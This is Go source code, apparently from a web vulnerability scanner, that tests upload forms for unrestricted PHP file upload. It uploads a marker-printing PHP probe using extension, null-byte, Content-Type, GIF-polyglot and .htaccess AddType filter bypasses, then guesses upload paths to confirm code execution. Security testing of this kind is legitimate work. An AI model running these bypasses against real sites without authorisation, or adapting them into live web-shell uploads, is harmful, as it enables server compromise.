package engine

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/antchfx/htmlquery"
)

// FileUploadOptions задаёт параметры нативной проверки форм загрузки файлов
// на неограниченный upload PHP-файлов (unrestricted file upload → RCE).
// Загружается безопасный маркерный PHP-пробник несколькими обходами
// фильтров, затем движок пытается найти и выполнить загруженный файл —
// без вызова внешних инструментов.
type FileUploadOptions struct {
	URL, VirtualHost, Cookie string
	Insecure                 bool
	Timeout                  time.Duration
	Concurrency              int
}
type FileUploadHit struct {
	FormURL, Action, Field, Technique, Filename, ServedAt, Evidence string
}
type FileUploadProgress struct {
	Done, Total int
	Hit         *FileUploadHit
}
type FileUploadResult struct {
	Forms, Fields, Done, Total, Errors int
	Hits                                []FileUploadHit
	Limitation                          string
}

const (
	fileUploadMaxForms    = 10
	fileUploadMaxFields   = 100
	fileUploadMaxBody     = 1 << 20
	fileUploadGuessBudget = 2000 // общий бюджет запросов на подбор пути загруженного файла за весь прогон
)

var fileUploadGuessDirs = []string{"", "uploads/", "upload/", "files/", "file/", "media/", "images/", "img/", "assets/uploads/", "static/uploads/", "data/uploads/", "attachments/", "tmp/", "content/uploads/"}

type uploadForm struct {
	Action     *url.URL
	FileFields []string
	Order      []string
	Values     map[string]string
}

// parseUploadForms находит формы с полем <input type="file">. Объявленный
// enctype не важен: мы сами формируем multipart/form-data запрос напрямую к
// обработчику, как это делает sqlmap-подобный тул, а не браузер.
func parseUploadForms(base *url.URL, body []byte) []uploadForm {
	doc, err := htmlquery.Parse(bytes.NewReader(body))
	if err != nil || doc == nil {
		return nil
	}
	nodes, err := htmlquery.QueryAll(doc, "//form")
	if err != nil {
		return nil
	}
	forms := make([]uploadForm, 0, len(nodes))
	for _, node := range nodes {
		if len(forms) >= fileUploadMaxForms {
			break
		}
		action := base
		if raw := htmlquery.SelectAttr(node, "action"); raw != "" {
			if parsed, err := url.Parse(raw); err == nil {
				action = base.ResolveReference(parsed)
			}
		}
		if action.Scheme != "http" && action.Scheme != "https" {
			continue
		}
		form := uploadForm{Action: action, Values: map[string]string{}}
		fields, err := htmlquery.QueryAll(node, ".//input|.//textarea|.//select")
		if err != nil {
			continue
		}
		for _, field := range fields {
			name := htmlquery.SelectAttr(field, "name")
			if name == "" {
				continue
			}
			typ := strings.ToLower(htmlquery.SelectAttr(field, "type"))
			if field.Data == "input" && typ == "file" {
				form.FileFields = append(form.FileFields, name)
				continue
			}
			if field.Data == "input" {
				switch typ {
				case "submit", "button", "reset", "image":
					continue
				}
			}
			value := htmlquery.SelectAttr(field, "value")
			if field.Data == "select" {
				value = sqliSelectedOption(field)
			}
			if _, exists := form.Values[name]; !exists {
				form.Order = append(form.Order, name)
			}
			form.Values[name] = value
		}
		if len(form.FileFields) == 0 {
			continue
		}
		forms = append(forms, form)
	}
	return forms
}

type uploadTechnique struct {
	label, filename, contentType string
	polyglot                     bool
}

var uploadTechniques = []uploadTechnique{
	{"без обхода (.php)", "wscan_shell.php", "application/octet-stream", false},
	{"альтернативное расширение .phtml", "wscan_shell.phtml", "application/octet-stream", false},
	{"альтернативное расширение .pht", "wscan_shell.pht", "application/octet-stream", false},
	{"альтернативное расширение .php5", "wscan_shell.php5", "application/octet-stream", false},
	{"двойное расширение .php.jpg", "wscan_shell.php.jpg", "image/jpeg", false},
	{"null byte .php%00.jpg", "wscan_shell.php\x00.jpg", "image/jpeg", false},
	{"подмена Content-Type (.php как image/jpeg)", "wscan_shell.php", "image/jpeg", false},
	{"polyglot GIF + .php", "wscan_shell_poly.php", "image/gif", true},
}

func phpMarkerPayload(marker string, polyglot bool) []byte {
	code := fmt.Sprintf(`<?php echo "%s"; ?>`, marker)
	if polyglot {
		return []byte("GIF89a;\n" + code)
	}
	return []byte(code)
}

// buildMultipart собирает multipart/form-data тело: все обычные поля формы
// с их исходными значениями (включая CSRF-токены из hidden-полей) плюс один
// файл в поле fileField с заданным именем/содержимым/Content-Type.
func buildMultipart(f uploadForm, fileField, filename, contentType string, payload []byte) (string, []byte, error) {
	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	for _, name := range f.Order {
		if err := w.WriteField(name, f.Values[name]); err != nil {
			return "", nil, err
		}
	}
	header := textproto.MIMEHeader{}
	header.Set("Content-Disposition", fmt.Sprintf(`form-data; name="%s"; filename="%s"`, fileField, filename))
	header.Set("Content-Type", contentType)
	part, err := w.CreatePart(header)
	if err != nil {
		return "", nil, err
	}
	if _, err := part.Write(payload); err != nil {
		return "", nil, err
	}
	if err := w.Close(); err != nil {
		return "", nil, err
	}
	return w.FormDataContentType(), buf.Bytes(), nil
}

// extractUploadedPaths вытаскивает из тела ответа все токены, заканчивающиеся
// именем загруженного файла (href/src/JSON-поля и т.п.) — кандидаты на URL,
// по которому сервер отдаёт загруженный файл.
func extractUploadedPaths(body, filename string) []string {
	if filename == "" {
		return nil
	}
	var out []string
	seen := map[string]bool{}
	idx := 0
	for {
		pos := strings.Index(body[idx:], filename)
		if pos < 0 {
			break
		}
		pos += idx
		start := pos
		for start > 0 {
			switch body[start-1] {
			case '"', '\'', '(', ' ', '\n', '\t', '\r', '>', ',':
				goto found
			}
			start--
		}
	found:
		end := pos + len(filename)
		token := body[start:end]
		if token != "" && !seen[token] {
			seen[token] = true
			out = append(out, token)
		}
		idx = end
		if idx >= len(body) {
			break
		}
	}
	return out
}

// ScanFileUpload загружает страницу o.URL, находит на ней формы с полем
// загрузки файла и пытается залить безопасный PHP-пробник (который просто
// печатает уникальный маркер) несколькими обходами фильтра расширений.
// Если после загрузки найденный/угаданный URL отдаёт именно этот маркер без
// исходного кода PHP — значит файл был выполнен интерпретатором, то есть
// подтверждён RCE через unrestricted file upload.
func ScanFileUpload(ctx context.Context, o FileUploadOptions, progress func(FileUploadProgress)) (FileUploadResult, error) {
	result := FileUploadResult{}
	base, err := url.Parse(o.URL)
	if err != nil || base.Hostname() == "" || (base.Scheme != "http" && base.Scheme != "https") || base.User != nil {
		return result, fmt.Errorf("укажи HTTP/HTTPS URL без учётных данных")
	}
	if strings.ContainsAny(o.VirtualHost, "/\\\r\n\t ") || strings.Contains(o.VirtualHost, ":") {
		return result, fmt.Errorf("virtual host: только имя без порта и пути")
	}
	timeout := o.Timeout
	if timeout <= 0 {
		timeout = 15 * time.Second
	}
	workers := o.Concurrency
	if workers < 1 {
		workers = 4
	}
	if workers > 8 {
		workers = 8
	}
	markerBytes := make([]byte, 8)
	if _, err := rand.Read(markerBytes); err != nil {
		return result, err
	}
	marker := "wscan_rce_" + hex.EncodeToString(markerBytes) + "_ok"
	transport := &http.Transport{Proxy: http.ProxyFromEnvironment, TLSClientConfig: &tls.Config{InsecureSkipVerify: o.Insecure}}
	defer transport.CloseIdleConnections()
	client := &http.Client{Transport: transport, Timeout: timeout, CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	var guessBudget atomic.Int64
	guessBudget.Store(fileUploadGuessBudget)
	do := func(method, target, contentType string, body []byte) (int, string, error) {
		if err := ctx.Err(); err != nil {
			return 0, "", err
		}
		var reqBody io.Reader
		if body != nil {
			reqBody = bytes.NewReader(body)
		}
		req, err := http.NewRequestWithContext(ctx, method, target, reqBody)
		if err != nil {
			return 0, "", err
		}
		req.Header.Set("User-Agent", "wscan-file-upload")
		if contentType != "" {
			req.Header.Set("Content-Type", contentType)
		}
		if o.VirtualHost != "" {
			req.Host = o.VirtualHost
		}
		if o.Cookie != "" {
			req.Header.Set("Cookie", o.Cookie)
		}
		resp, err := client.Do(req)
		if err != nil {
			return 0, "", err
		}
		defer resp.Body.Close()
		data, err := io.ReadAll(io.LimitReader(resp.Body, fileUploadMaxBody))
		if err != nil {
			return resp.StatusCode, "", err
		}
		return resp.StatusCode, string(data), nil
	}
	pageStatus, pageBody, err := do(http.MethodGet, base.String(), "", nil)
	if err != nil {
		return result, fmt.Errorf("не удалось загрузить страницу: %w", err)
	}
	if pageStatus < 200 || pageStatus >= 400 {
		return result, fmt.Errorf("страница вернула HTTP %d", pageStatus)
	}
	forms := parseUploadForms(base, []byte(pageBody))
	result.Forms = len(forms)
	if len(forms) == 0 {
		return result, fmt.Errorf("на странице не найдено форм с полем загрузки файла")
	}
	type job struct {
		formIndex int
		field     string
	}
	var jobs []job
collect:
	for fi, f := range forms {
		for _, field := range f.FileFields {
			if len(jobs) >= fileUploadMaxFields {
				result.Limitation = fmt.Sprintf("Проверка ограничена %d полями загрузки (найдено больше)", fileUploadMaxFields)
				break collect
			}
			jobs = append(jobs, job{fi, field})
		}
	}
	result.Fields = len(jobs)
	result.Total = len(jobs)
	// locate пытается найти и выполнить загруженный файл: сперва по ссылкам
	// в самом ответе, затем — если ответ не похож на явный отказ — по списку
	// типичных каталогов загрузки.
	locate := func(resp200 bool, respBody, filename string) (string, string) {
		candidates := []string{}
		seen := map[string]bool{}
		add := func(raw string) {
			parsed, err := base.Parse(raw)
			if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") {
				return
			}
			s := parsed.String()
			if !seen[s] {
				seen[s] = true
				candidates = append(candidates, s)
			}
		}
		for _, token := range extractUploadedPaths(respBody, filename) {
			add(token)
		}
		if resp200 {
			siteRoot := base.Scheme + "://" + base.Host + "/"
			pageDir := base.String()
			if i := strings.LastIndex(pageDir, "/"); i >= 0 {
				pageDir = pageDir[:i+1]
			}
			for _, dir := range fileUploadGuessDirs {
				if guessBudget.Add(-2) < 0 {
					break
				}
				add(siteRoot + dir + filename)
				add(pageDir + dir + filename)
			}
		}
		for _, candidate := range candidates {
			if ctx.Err() != nil {
				break
			}
			status, body, err := do(http.MethodGet, candidate, "", nil)
			if err != nil || status < 200 || status >= 300 {
				continue
			}
			if strings.Contains(body, marker) && !strings.Contains(body, "<?php") {
				return candidate, fmt.Sprintf("маркер выведен интерпретатором по адресу %s (PHP-исходник в ответе отсутствует)", candidate)
			}
		}
		return "", ""
	}
	testField := func(fi int, field string) (*FileUploadHit, bool) {
		f := forms[fi]
		attempts, failures := 0, 0
		attempt := func(technique, filename, contentType string, payload []byte) *FileUploadHit {
			attempts++
			contentTypeHeader, body, err := buildMultipart(f, field, filename, contentType, payload)
			if err != nil {
				failures++
				return nil
			}
			status, respBody, err := do(http.MethodPost, f.Action.String(), contentTypeHeader, body)
			if err != nil {
				failures++
				return nil
			}
			servedAt, evidence := locate(status >= 200 && status < 400, respBody, filename)
			if servedAt == "" {
				return nil
			}
			return &FileUploadHit{FormURL: base.String(), Action: f.Action.String(), Field: field, Technique: technique, Filename: filename, ServedAt: servedAt, Evidence: evidence}
		}
		for _, t := range uploadTechniques {
			if h := attempt(t.label, t.filename, t.contentType, phpMarkerPayload(marker, t.polyglot)); h != nil {
				return h, false
			}
		}
		// Двухэтапный .htaccess-обход: переопределяем обработчик для .jpg в
		// каталоге загрузки, затем заливаем маркер уже как картинку.
		htaccess := []byte("AddType application/x-httpd-php .jpg\n")
		attempts++
		if _, _, err := buildMultipartAndSend(do, f, field, ".htaccess", "text/plain", htaccess); err != nil {
			failures++
		} else if h := attempt(".htaccess AddType + .jpg", "wscan_shell.jpg", "image/jpeg", phpMarkerPayload(marker, false)); h != nil {
			return h, false
		}
		return nil, attempts > 0 && failures == attempts
	}
	var mu sync.Mutex
	var done atomic.Int64
	var wg sync.WaitGroup
	queue := make(chan job, workers)
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range queue {
				if ctx.Err() != nil {
					return
				}
				h, errored := testField(j.formIndex, j.field)
				mu.Lock()
				event := FileUploadProgress{Done: int(done.Add(1)), Total: result.Total}
				if errored {
					result.Errors++
				}
				if h != nil {
					result.Hits = append(result.Hits, *h)
					event.Hit = h
				}
				if progress != nil {
					progress(event)
				}
				mu.Unlock()
			}
		}()
	}
feed:
	for _, j := range jobs {
		select {
		case <-ctx.Done():
			break feed
		case queue <- j:
		}
	}
	close(queue)
	wg.Wait()
	result.Done = int(done.Load())
	return result, ctx.Err()
}

// buildMultipartAndSend — вспомогательная обёртка для вспомогательной
// (не маркерной) загрузки, например .htaccess на этапе обхода фильтра.
func buildMultipartAndSend(do func(method, target, contentType string, body []byte) (int, string, error), f uploadForm, field, filename, contentType string, payload []byte) (int, string, error) {
	ct, body, err := buildMultipart(f, field, filename, contentType, payload)
	if err != nil {
		return 0, "", err
	}
	return do(http.MethodPost, f.Action.String(), ct, body)
}
